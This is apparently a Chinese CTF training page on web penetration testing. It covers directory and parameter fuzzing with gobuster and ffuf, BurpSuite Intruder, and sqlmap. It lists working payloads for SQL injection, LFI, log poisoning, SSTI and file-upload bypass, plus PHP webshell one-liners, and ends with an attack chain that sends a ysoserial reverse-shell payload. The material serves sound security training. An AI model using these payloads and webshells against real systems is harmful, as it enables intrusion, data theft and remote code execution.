---
category: "Web渗透"
tags: ["Web渗透", "目录爆破", "gobuster", "ffuf", "参数发现", "API测试", "BurpSuite", "SQL注入", "XSS", "文件包含", "CTF"]
difficulty: "中级"
---

# Web应用渗透

## 1. 概述

Web应用是CTF竞赛中最常见也是最重要的攻击面。无论是Jeopardy模式的Web题目，还是Attack-Defense模式中的Web服务，其攻击路径通常包括：目录/文件爆破、参数发现、API接口枚举、认证绕过、注入漏洞利用、文件包含、反序列化、SSRF、XXE等。本节聚焦于CTF Web渗透的工具链和技巧，特别关注断网离线环境下的使用方式。

## 2. 核心原理

### 2.1 Web渗透方法论概览

Web渗透通常遵循以下流程：

```
1. 初始侦察
   └── HTTP响应头分析、WAF识别、技术栈识别
2. 目录与文件枚举
   └── 发现隐藏路径、备份文件、源代码泄露
3. 参数与输入点发现
   └── GET/POST参数、Cookie、HTTP头注入点
4. 认证与授权测试
   └── 弱密码、逻辑缺陷、JWT攻击、OAuth
5. 注入类漏洞
   └── SQLi、NoSQLi、命令注入、代码注入
6. 文件操作漏洞
   └── LFI/RFI、文件上传、路径穿越
7. 反序列化与模板注入
   └── SSTI、PHP反序列化、Java反序列化
8. SSRF与XXE
   └── 内网探测、文件读取
9. XSS与CSRF
   └── 存储/反射/DOM型XSS
```

### 2.2 CTF Web题目特征

| 特征 | 说明 |
|------|------|
| 源码审计 | 常提供部分或全部源码，需要审计逻辑漏洞 |
| 版本提示 | Dockerfile/Comment可能泄露框架版本 |
| 黑盒+白盒 | 混合测试思想，利用源码定位漏洞点 |
| 链式利用 | 多种漏洞串联达成RCE或Flag读取 |
| 非标准组件 | 小众框架/语言，需要快速学习 |
| 环境重置 | 每个Session环境独立，适合暴力尝试 |

## 3. 关键工具与命令

### 3.1 目录/文件爆破 — Gobuster

```bash
# 安装
sudo apt install gobuster

# === 目录模式 (dir) ===
# 基础用法
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# 指定扩展名
gobuster dir -u http://10.10.10.5 -w wordlist.txt -x php,html,txt,bak,zip,tar.gz,sql,old,conf

# 自定义线程和超时
gobuster dir -u http://10.10.10.5:8080 -w wordlist.txt -t 50 --timeout 5s

# 过滤状态码
gobuster dir -u http://10.10.10.5 -w wordlist.txt -s "200,204,301,302,307,401,403,405,500"

# 排除特定状态码
gobuster dir -u http://10.10.10.5 -w wordlist.txt --exclude-status 404,400

# 添加Cookie进行认证后爆破
gobuster dir -u http://10.10.10.5 -w wordlist.txt -c "PHPSESSID=abc123; token=xyz"

# 添加HTTP头
gobuster dir -u http://10.10.10.5 -w wordlist.txt \
    -H "Authorization: Bearer eyJhbGciOi..." \
    -H "X-Custom: value"

# 跟随重定向
gobuster dir -u http://10.10.10.5 -w wordlist.txt -r

# 代理到BurpSuite
gobuster dir -u http://10.10.10.5 -w wordlist.txt --proxy http://127.0.0.1:8080

# === 子域名模式 (dns) ===
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# === VHOST模式 (vhost) ===
gobuster vhost -u http://10.10.10.5 -w wordlist.txt --domain target.com

# === S3存储桶模式 (s3) ===
gobuster s3 -w bucket_names.txt
```

**Gobuster输出格式优化：**
```bash
# 生成结构化输出
gobuster dir -u http://10.10.10.5 -w wordlist.txt -o gobuster_results.txt

# 输出为JSON（方便后续脚本处理）
gobuster dir -u http://10.10.10.5 -w wordlist.txt -o results.json -f json

# 解析JSON结果
python3 << 'PYEOF'
import json
with open('results.json') as f:
    data = json.load(f)
for r in data['results']:
    print(f"{r['status']} | {r['url']} | Size: {r['size']}")
PYEOF
```

### 3.2 参数/模糊测试 — ffuf

ffuf (Fuzz Faster U Fool) 是用Go语言编写的超快速Web模糊测试工具，是CTF中参数发现、虚拟主机枚举、POST数据fuzz的首选。

```bash
# 安装
sudo apt install ffuf
# 或下载二进制
wget https://github.com/ffuf/ffuf/releases/latest/download/ffuf_amd64 -O /usr/local/bin/ffuf
chmod +x /usr/local/bin/ffuf

# === 目录发现 ===
ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# === 文件扩展名爆破 ===
ffuf -u http://10.10.10.5/index.FUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt

# === GET参数发现 ===
ffuf -u "http://10.10.10.5/page.php?FUZZ=test" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs 0  # 过滤size=0的响应

# === 参数值爆破 ===
ffuf -u "http://10.10.10.5/api/user?role=FUZZ" \
     -w roles.txt \
     -fc 403  # 排除403响应

# === POST数据模糊测试 ===
ffuf -u http://10.10.10.5/login \
     -X POST \
     -d "username=admin&password=FUZZ" \
     -w /usr/share/wordlists/rockyou.txt \
     -fc 401

# Content-Type为JSON的POST
ffuf -u http://10.10.10.5/api/login \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"username":"FUZZ","password":"test"}' \
     -w usernames.txt

# === Cookie值模糊测试 ===
ffuf -u http://10.10.10.5/admin \
     -H "Cookie: session=FUZZ" \
     -w session_ids.txt \
     -fw 50  # 过滤字数<50的响应（表示错误页面）

# === 虚拟主机发现 ===
ffuf -u http://10.10.10.5 \
     -H "Host: FUZZ.target.com" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs <size_of_default_page>

# === 递归发现 ===
ffuf -u http://10.10.10.5/FUZZ \
     -w wordlist.txt \
     -recursion -recursion-depth 2

# === 响应过滤技巧 ===
# -fc: 过滤HTTP状态码
# -fl: 过滤行数
# -fr: 过滤正则匹配
# -fs: 过滤响应大小
# -fw: 过滤词数
# -ft: 过滤响应时间(ms)

# 实用过滤组合：排除404+空响应
ffuf -u http://10.10.10.5/FUZZ -w wordlist.txt -fc 404 -fs 0

# 使用正则过滤错误页面
ffuf -u http://10.10.10.5/FUZZ -w wordlist.txt \
     -fr ".*(not found|error|404).*"

# === 多位置FUZZ ===
# 同时模糊URL路径和参数
ffuf -u http://10.10.10.5/FUZZ1?file=FUZZ2 \
     -w /path/to/dirs.txt:FUZZ1 \
     -w /path/to/files.txt:FUZZ2

# === 速率控制与并发 ===
ffuf -u http://10.10.10.5/FUZZ -w wordlist.txt \
     -t 100 \        # 100并发线程
     -p 0.1 \        # 请求间延迟0.1秒
     -rate 500       # 每秒最多500请求

# === 保存与恢复 ===
# 保存进度
ffuf -u http://10.10.10.5/FUZZ -w wordlist.txt -o results.json
# 从上次中断继续
ffuf -u http://10.10.10.5/FUZZ -w wordlist.txt -resume results.json

# === 完整链路示例：目录→参数→值 ===
# Step 1: 发现目录
ffuf -u http://10.10.10.5/FUZZ -w dirs.txt -fc 404 -o step1_dirs.json

# Step 2: 对于找到的每个目录，发现参数
# 假设发现了 /api/v1/
ffuf -u "http://10.10.10.5/api/v1/user?FUZZ=1" \
     -w /usr/share/seclists/Discovery/Web-Content/api-params.txt \
     -fc 400,404 -o step2_params.json

# Step 3: 参数值爆破
ffuf -u "http://10.10.10.5/api/v1/user?id=FUZZ" \
     -w ids.txt -X GET -fc 404 -o step3_values.json
```

### 3.3 BurpSuite离线使用

BurpSuite是Web渗透的核心工具，在CTF断网环境下需要注意：

**离线激活与配置：**
```bash
# CTF离线环境中的BurpSuite准备
# 1. 确保赛前已激活（Pro版破解或Community版）
# 2. 加载本地插件（无需Marketplace）
# 3. 准备本地字典用于Intruder
# 4. 配置本地存储目录

# BurpSuite数据目录结构
~/.BurpSuite/
├── burp-project-options.json   # 项目配置
├── user-options.json           # 用户配置
├── extensions/                 # 离线安装的插件
│   ├── active-scan++.jar
│   ├── autorepeater.jar
│   ├── backslash-powered-scanner.jar
│   ├── collaborator-everywhere.jar  # 断网环境可能受限
│   └── retire-js.jar
└── intruder-payloads/          # 自定义Payload
    ├── sqli.txt
    ├── xss.txt
    ├── lfi.txt
    └── ssrf.txt
```

**BurpSuite关键快捷键（离线无交互指南）：**
```
Ctrl+R    发送到Repeater
Ctrl+I    发送到Intruder
Ctrl+Shift+F  全局搜索
Ctrl+Shift+L  搜索选中文本
Ctrl+Shift+M  修改HTTP方法
Ctrl+Shift+U  URL解码选中文本
Ctrl+Shift+H  HTML解码选中文本
Ctrl+Shift+B  Base64解码选中文本
Ctrl+Z       URL编码选中文本
```

**Intruder攻击类型选择：**
| 类型 | 含义 | 适用场景 |
|------|------|---------|
| Sniper | 单位置+单字典 | 参数名/值逐个测试 |
| Battering ram | 多位置+相同值 | 多参数相同值 |
| Pitchfork | 多位置+多字典(一一对应) | 用户名+密码组合爆破 |
| Cluster bomb | 多位置+全组合 | 多参数排列组合 |

**Intruder Payload位置标记（离线场景常用）：**
```
# SQL注入Payload位置
§admin' OR '1'='1§

# XSS Payload位置
<script>alert(§1§)</script>

# 文件路径Payload位置
../../../../../../etc/passwd§%00§

# JSON Payload位置
{"username":"§admin§","role":"§admin§"}
```

### 3.4 URL/端点发现工具链

```bash
# === waybackurls 备选 (离线收集历史URL) ===
# 如果有本地存储的历史数据
cat ctf_history/*.txt | grep -E "\.php|\.asp|\.jsp|\.do|\.action|api|admin|login" | sort -u > endpoints.txt

# === LinkFinder - JavaScript中提取端点 ===
# 安装
git clone https://github.com/GerbenJavado/LinkFinder.git
cd LinkFinder
python3 setup.py install

# 使用
python3 linkfinder.py -i http://10.10.10.5/main.js -o cli
python3 linkfinder.py -i http://10.10.10.5/app.bundle.js -o results.html

# === 批量JS提取端点 ===
# 先收集页面中的JS文件
curl -s http://10.10.10.5 | grep -oP 'src="[^"]*\.js"' | cut -d'"' -f2 > js_files.txt
# 逐个分析
while read -r js_file; do
    url="http://10.10.10.5${js_file}"
    curl -s "$url" 2>/dev/null | \
        grep -oP '(?:"|'"'"'|`)(\/[a-zA-Z0-9_\/\.-]+)(?:"|'"'"'|`)' | \
        sort -u >> api_endpoints.txt
done < js_files.txt

# === Arjun (HTTP参数发现专用) ===
# 安装
pip3 install arjun

# 使用
arjun -u http://10.10.10.5/page.php
arjun -u http://10.10.10.5/api/endpoint --get
arjun -u http://10.10.10.5/login --json -m POST
arjun -u http://10.10.10.5/api -w /usr/share/seclists/Discovery/Web-Content/api-params.txt
```

### 3.5 技术栈/WAF识别

```bash
# === WhatWeb (技术指纹识别) ===
whatweb http://10.10.10.5
whatweb -a 3 http://10.10.10.5  # 最激进扫描模式
whatweb --log-json=whatweb.json http://10.10.10.5

# === WafW00f (WAF检测) ===
wafw00f http://10.10.10.5
wafw00f -a http://10.10.10.5  # 查找所有可用WAF检测插件

# === 手动WAF规避测试 ===
# 1. 发送简单探测请求
curl -I http://10.10.10.5

# 2. 发送可能的攻击payload看响应
curl "http://10.10.10.5/?id=1' OR '1'='1"
# 观察响应头中的WAF标志：
# - X-CDN: Cloudflare
# - Server: AWSALB
# - X-Sucuri-ID: Sucuri
# - Server: nginx + 特殊cookie = ModSecurity

# 3. 请求方法篡改绕过
# 如果WAF仅监控GET/POST
curl -X PUT -d "id=1' OR '1'='1" http://10.10.10.5/api/user

# 4. Content-Type变更绕过
curl -X POST -H "Content-Type: application/xml" \
     -d "<user><name>admin' OR '1'='1</name></user>" \
     http://10.10.10.5/api/user
```

### 3.6 SQL注入快速测试

```bash
# === sqlmap 离线使用 ===
# 基础扫描
sqlmap -u "http://10.10.10.5/page.php?id=1" --batch

# 带Cookie认证
sqlmap -u "http://10.10.10.5/admin.php?id=1" \
       --cookie="PHPSESSID=abc123; token=xyz" --batch

# POST注入
sqlmap -u "http://10.10.10.5/login" \
       --data="username=admin&password=pass" --batch

# 提取数据库/表/列
sqlmap -u "http://10.10.10.5/page.php?id=1" --dbs          # 列出数据库
sqlmap -u "http://10.10.10.5/page.php?id=1" -D dbname --tables  # 列出表
sqlmap -u "http://10.10.10.5/page.php?id=1" -D dbname -T users --columns  # 列出列
sqlmap -u "http://10.10.10.5/page.php?id=1" -D dbname -T users --dump  # 导出数据

# 文件读取/写入
sqlmap -u "http://10.10.10.5/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://10.10.10.5/page.php?id=1" --file-write="shell.php" \
       --file-dest="/var/www/html/shell.php"

# OS Shell获取
sqlmap -u "http://10.10.10.5/page.php?id=1" --os-shell

# 使用Tor匿名（非CTF场景）
sqlmap -u "http://10.10.10.5/page.php?id=1" --tor --check-tor

# 绕过WAF的tamper脚本（SQLmap内置tamper目录）
# 列出tamper脚本
ls /usr/share/sqlmap/tamper/
# 组合多个tamper
sqlmap -u "http://10.10.10.5/page.php?id=1" \
       --tamper=space2comment,between,randomcase --batch

# === 手工SQL注入测试集 ===
# 数字型注入
?id=1 AND 1=1
?id=1 AND 1=2
?id=1 ORDER BY 10--
?id=1 UNION SELECT 1,2,3,4,5--

# 字符型注入
?id=1' AND '1'='1
?id=1' AND '1'='2
?id=1' ORDER BY 10--
?id=1' UNION SELECT 1,2,3,4,5--

# 时间盲注（SQLite/MySQL）
?id=1 AND SLEEP(5)
?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
?id=1' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)--

# 布尔盲注
?id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'
```

### 3.7 文件包含与文件上传

```bash
# === LFI测试Payload列表 ===
# 基础路径穿越
../../../../etc/passwd
../../../../etc/passwd%00
....//....//....//....//etc/passwd
..%252f..%252f..%252f..%252fetc/passwd

# PHP包装器
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
php://input
php://filter/zlib.deflate/resource=/etc/passwd

# 日志投毒
# Apache访问日志路径
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/nginx/access.log
# 污染User-Agent头
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://10.10.10.5/

# === SSTI测试（模板注入） ===
# Jinja2 (Flask)
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Smarty
{7*7}
{php}echo `id`;{/php}

# === 文件上传绕过 ===
# 扩展名绕过列表
shell.php
shell.php5
shell.phtml
shell.pHp
shell.php.jpg
shell.php.
shell.php%00.jpg
shell.php%0D%0A.jpg
shell.php::$DATA (Windows NTFS)
.CONFIG → .php (Windows 8.3文件名)

# Magic Bytes绕过
# 在前面加上合法文件头
GIF89a<?php system($_GET['cmd']); ?>
PNG...<?php system($_GET['cmd']); ?>
\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>

# 生成图片马
# PHP
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o payload.jpg
mv payload.jpg payload.php.jpg

# 或直接用echo
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
```

## 4. 离线CTF Web工具包清单

```
web-pentest-kit/
├── dictionaries/
│   ├── dirbuster/directory-list-2.3-medium.txt
│   ├── dirbuster/directory-list-2.3-small.txt
│   ├── dirbuster/directory-list-lowercase-2.3-medium.txt
│   ├── seclists/Discovery/Web-Content/
│   │   ├── common.txt
│   │   ├── directory-list-lowercase-2.3-medium.txt
│   │   ├── raft-medium-directories.txt
│   │   ├── raft-medium-files.txt
│   │   ├── api-endpoints.txt
│   │   ├── burp-parameter-names.txt
│   │   └── quickhits.txt
│   ├── extensions/
│   │   ├── web-extensions.txt
│   │   └── raft-medium-extensions.txt
│   └── fuzzing/
│       ├── SQLi.txt
│       ├── XSS.txt
│       ├── LFI.txt
│       └── SSTI.txt
├── scripts/
│   ├── auto_recon.sh
│   ├── js_endpoint_ extractor.py
│   └── quick_ web_fuzz.sh
└── payloads/
    ├── reverse_shells.md
    ├── php_webshell.php
    ├── jsp_webshell.jsp
    ├── asp_webshell.asp
    └── aspx_webshell.aspx
```

## 5. 实战示例

### 5.1 Web渗透完整攻击链

**场景：** 目标 `http://10.10.10.5:8080`，一个Java Web应用。

```bash
# 1. 技术栈识别
whatweb http://10.10.10.5:8080
curl -I http://10.10.10.5:8080
# 返回: Server: Apache-Coyote/1.1, X-Powered-By: Servlet/3.1 → Java应用

# 2. 目录爆破
gobuster dir -u http://10.10.10.5:8080 \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -x jsp,do,action,html -t 50 -o dirs.txt

# 发现 /admin, /api, /WEB-INF, /backup

# 3. 敏感路径探测
curl http://10.10.10.5:8080/WEB-INF/web.xml  # Java配置信息泄露
curl http://10.10.10.5:8080/backup/app.zip    # 源码备份
curl http://10.10.10.5:8080/.git/HEAD         # Git泄露

# 4. 如果发现.git泄露，恢复源码
git clone http://10.10.10.5:8080/.git/
# 或使用GitHacker
python3 GitHacker.py --url http://10.10.10.5:8080/.git/ --output-folder source

# 5. 审计源码发现JDBC连接信息
grep -r "jdbc:" source/
# jdbc:mysql://localhost:3306/webapp?user=root&password=root123

# 6. 发现存在反序列化漏洞
# 审计发现使用了Commons-Collections 3.2.1
# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAt...}|{base64,-d}|{bash,-i}" > payload.ser
# 发送到目标
curl -X POST --data-binary @payload.ser \
     -H "Content-Type: application/octet-stream" \
     http://10.10.10.5:8080/api/deserialize

# 7. 获得Shell后进行内网探测
# (使用nc监听4444端口)
# 连接后：
whoami
ls /flag*
cat /flag.txt  # 获取Flag! "CTF{Web_RCE_to_Internal}"
```

### 5.2 认证绕过案例

```bash
# SQL注入登录绕过
# 用户名: admin' --
# 密码: 任意值
# 生成SQL: SELECT * FROM users WHERE username='admin' --' AND password='xxx'

# 用户名: admin' OR '1'='1
# 密码: ' OR '1'='1
# 生成SQL: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='' OR '1'='1'

# JWT攻击
# 1. 获取JWT Token
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...  # 解码发现HS256
# 2. 修改alg为none
{"alg":"none","typ":"JWT"}.{"username":"admin","role":"admin"}
# 3. 将算法改为HS256并用公钥签名
python3 jwt_tool.py <token> -X k -pk public.pem

# Mass Assignment (批量赋值) 攻击
# 注册时添加额外字段
POST /api/register HTTP/1.1
Content-Type: application/json

{
    "username":"attacker",
    "password":"test",
    "role":"admin",     # 额外添加的字段
    "isAdmin": true     # 可能生效
}
```

## 6. 常见误区与注意事项

- **误区1：只爆破目录不爆破文件。** 备份文件(.bak/.old/.zip/.tar.gz)、配置文件(.env/.config/.git)经常泄露敏感信息。
- **误区2：忽略404页面的不同行为。** 有些应用对存在和不存在的资源返回的404页面大小不同，这种细微差异可用于盲发现。
- **误区3：依赖单个工具的结果。** gobuster和ffuf的字典差异会导致不同结果，应交叉验证。
- **误区4：忽略非标准Content-Type。** JSON/XML/GraphQL端点的注入方法与form-urlencoded不同。
- **误区5：过度依赖sqlmap。** 竞赛中WAF和自定义注入点可能绕过sqlmap自动检测，手工测试能力不可替代。
- **注意：断网环境无法拉取最新字典，赛前必须准备好完整的字典集。**
- **注意：BurpSuite Community版不支持被动扫描和许多高级功能，建议赛前激活Pro或使用OWASP ZAP + Burp社区版组合。**

## 7. 相关知识点

- **OWASP Top 10 (2021)：** Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration
- **SSRF攻击面：** AWS/GCP/Azure元数据端点、本地服务端口、内网探测
- **XXE攻击：** 利用XML解析器读文件、SSRF、DoS
- **反序列化漏洞：** PHP对象注入、Java反序列化(ysoserial)、Python Pickle
- **SSTI (Server-Side Template Injection)：** Jinja2、Twig、Freemarker、Velocity、ERB
- **GraphQL安全测试：** Introspection查询、深度嵌套DoS、权限绕过
- **OAuth 2.0攻击：** 重定向URI滥用、state参数缺失、JWT弱签
- **CORS配置错误：** Access-Control-Allow-Origin: * 的危害
